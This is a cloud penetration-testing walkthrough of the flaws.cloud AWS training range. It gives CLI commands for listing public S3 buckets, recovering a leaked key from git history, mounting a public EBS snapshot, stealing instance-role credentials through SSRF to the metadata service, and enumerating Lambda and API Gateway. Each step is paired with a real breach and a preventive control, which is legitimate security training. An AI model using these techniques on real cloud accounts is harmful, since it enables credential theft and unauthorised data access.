# flAWS.cloud — Cloud Penetration Testing Walkthrough

> Hands-on exploitation of six common AWS misconfigurations using the
> [flaws.cloud](http://flaws.cloud) training range by Scott Piper (Summit Route).
> Each level is mapped to the real-world breach it mirrors, the relevant
> MITRE ATT&CK technique, and the control that prevents it.
>
> **Author:** Peter Mwangi (GitHub: Imwangi254)
> **Context:** Cloud Security
> **Date:** October 2026
> **Tooling:** Kali Linux (VMware), AWS CLI v2, ScoutSuite, dig/host, git, curl

> NOTE ON REDACTION. flaws.cloud is an intentionally vulnerable, authorised
> training target. Recovered passwords, access keys, and my own AWS account ID
> are redacted (shown as [REDACTED]). The objective is to document the
> methodology, not to leak secrets — itself the lesson of several levels.

---

## Attacker kill-chain at a glance

| Level | Misconfiguration | Real-world parallel | MITRE ATT&CK |
|-------|------------------|---------------------|--------------|
| 1 | S3 bucket public to everyone (anonymous list) | Football Australia; LA Times | T1619 → T1530 |
| 2 | S3 bucket open to any authenticated AWS account | Common SaaS misconfig | T1530 |
| 3 | Access key leaked in git history | Football Australia | T1552.001 → T1078.004 |
| 4 | Public EBS snapshot of a web server | Backups left shared/unencrypted | T1580 |
| 5 | SSRF → EC2 Instance Metadata Service via open proxy | Capital One (2019) | T1552.005 |
| 6 | Over-permissive read-only IAM exposing Lambda/API Gateway | Recon via read rights | T1087; T1526 |

---

## Level 1 — Public S3 bucket (anonymous access)

Website hosted on an S3 bucket allowing public ListBucket to AllUsers. Listing
exposes an object not linked anywhere on the site.

    dig flaws.cloud
    host -x <resolved-ip>        # s3-website-us-west-2.amazonaws.com
    aws s3 ls s3://flaws.cloud/ --no-sign-request    # reveals secret-<id>.html

Lesson: a listable bucket leaks "hidden" object names; obscurity is not security.
Parallel: Football Australia (public passports/contracts); LA Times (writable bucket, cryptominer injected).
Control: S3 Block Public Access at the account level; never grant to AllUsers.

## Level 2 — "Authenticated Users" bucket

The bucket grants AuthenticatedUsers — ANY valid AWS account, not just this org.

    aws s3 ls s3://level2-<id>.flaws.cloud/ --no-sign-request        # AccessDenied
    aws s3 ls s3://level2-<id>.flaws.cloud/ --profile <readonly>     # succeeds

Control: grant to specific IAM principals only; keep Block Public Access on.

## Level 3 — Leaked access key in git history

The bucket exposes a .git/ directory; a key "removed" in a later commit survives.

    aws s3 ls s3://level3-<id>.flaws.cloud/ --profile <readonly>   # PRE .git/
    aws s3 sync s3://level3-<id>.flaws.cloud/ ./level3 --profile <readonly>
    cd level3 && git log
    git checkout <first-commit> && cat access_keys.txt   # [REDACTED]
    aws sts get-caller-identity --profile flaws3         # user/backup

Lesson: deleting a secret in a new commit does nothing; rotate at the source.
Parallel: Football Australia key in site code, un-rotated ~681 days.
Control: revoke exposed keys; pre-commit scanning (gitleaks, trufflehog); prefer short-lived role creds.

## Level 4 — Public EBS snapshot

The 'backup' user shared an EBS snapshot of the web server publicly. Copy it into
your own account and read the disk — bypassing the web login.

    aws ec2 describe-snapshots --owner-ids <flaws-acct> --profile flaws3 --region us-west-2
    aws ec2 create-volume --availability-zone us-west-2a --snapshot-id snap-<id> --profile admin --region us-west-2
    # launch t3.micro in us-west-2a, attach /dev/sdf, SSH in:
    sudo mount /dev/nvme1n1p1 /mnt/flaws
    cat /mnt/flaws/home/ubuntu/setupNginx.sh   # htpasswd ... [REDACTED]

All attacker-side resources were terminated/deleted immediately after use.
Lesson: a public/unencrypted snapshot is as good as handing over the disk.
Control: never make snapshots public; encrypt EBS; restrict ModifySnapshotAttribute.

## Level 5 — SSRF to the Instance Metadata Service (the Capital One technique)

An open HTTP proxy on the EC2 can be pointed at 169.254.169.254 (IMDS), returning
the instance role's temporary credentials.

    curl http://<proxy>/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
    curl http://<proxy>/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
    # ASIA... + SecretAccessKey + Token  [REDACTED]
    aws configure set aws_access_key_id "<ASIA...>" --profile flaws5
    aws configure set aws_secret_access_key "<secret>" --profile flaws5
    aws configure set aws_session_token "<token>" --profile flaws5
    aws s3 ls s3://level6-<id>.flaws.cloud/ --profile flaws5   # PRE <hidden-dir>/

Parallel: Capital One (2019) — SSRF to IMDS, 100M+ records exposed.
Control: enforce IMDSv2; block app access to 169.254.169.254; least-privilege roles.

## Level 6 — Over-permissive read-only IAM + exposed Lambda/API Gateway

The Level6 user has SecurityAudit + list_apigateways. Read-only is enough to
enumerate a Lambda, read its policy, recover the API Gateway ID, and build the URL.

    aws iam list-attached-user-policies --user-name Level6 --profile flaws6
    aws lambda list-functions --profile flaws6 --region us-west-2
    aws lambda get-policy --function-name Level6 --profile flaws6 --region us-west-2
    #   SourceArn: ...execute-api:us-west-2:<acct>:<api-id>/*/GET/level6
    aws apigateway get-stages --rest-api-id <api-id> --profile flaws6 --region us-west-2
    # https://<api-id>.execute-api.us-west-2.amazonaws.com/Prod/level6

Lesson: even "harmless" read permissions give an attacker a map of the environment.
Control: least privilege even for audit roles; monitor enumeration in CloudTrail.

---

## Defensive hardening applied to my own lab account

| Control | Why (maps to level/breach) |
|---------|----------------------------|
| Root account MFA | Protect the un-restrictable super-user |
| Separate admin IAM user (+MFA); root locked away | Least privilege / audit trail |
| Dedicated read-only user for ScoutSuite | Least privilege for tooling |
| Deleted stale keys; removed admin CLI key after use | L3/L4 — rotate & remove exposed keys |
| S3 Block Public Access (account-level) | L1/L2 — Football Australia, LA Times |
| Strong IAM password policy (14+, complexity, no reuse) | Credential hygiene |
| CloudTrail (multi-region, log-file validation, recursive) | Detection & incident investigation |
| Zero-spend budget alert | Early warning for resource-hijacking |

ScoutSuite usage:

    scout aws --profile scout --regions eu-west-1 us-east-1
    # HTML report in ./scoutsuite-report/ — treat as SENSITIVE

---

## Key takeaways

1. Deleting a secret is not revoking it — keys in git/files/snapshots live on.
2. "Public" has two faces: AllUsers (anyone) and AuthenticatedUsers (any AWS account).
3. Backups are data-at-rest — a public snapshot defeats every live-system control.
4. IMDS is a credential vending machine — any SSRF reaching it steals role creds; enforce IMDSv2.
5. Read-only is not harmless — enumeration is step one of every attack.
6. Clean up after every exercise — stale resources are cost risk and attack surface.

---

Training range: flaws.cloud by Scott Piper. Follow-up: flaws2.cloud.
